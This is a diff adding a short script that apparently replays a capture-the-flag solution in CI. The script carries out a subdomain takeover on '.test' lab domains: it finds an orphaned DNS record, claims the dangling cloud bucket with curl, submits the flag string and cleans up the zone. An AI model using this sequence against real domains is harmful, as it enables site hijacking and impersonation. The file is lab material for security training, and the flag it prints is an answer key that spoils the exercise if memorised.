@@ -1,0 +1,9 @@
+# The orphan subdomain: the shortest path, replayed by CI in every language.
+cat fournil/zone.txt
+dig promo.fournil.test
+curl https://promo.fournil.test/
+curl -d "bucket=fournil-promo-2025" https://console.nuage.test/
+curl https://promo.fournil.test/
+submit FLAG{fournil-orphan-claimed-9b3e}
+sed -i "/^promo /d" fournil/zone.txt
+verify
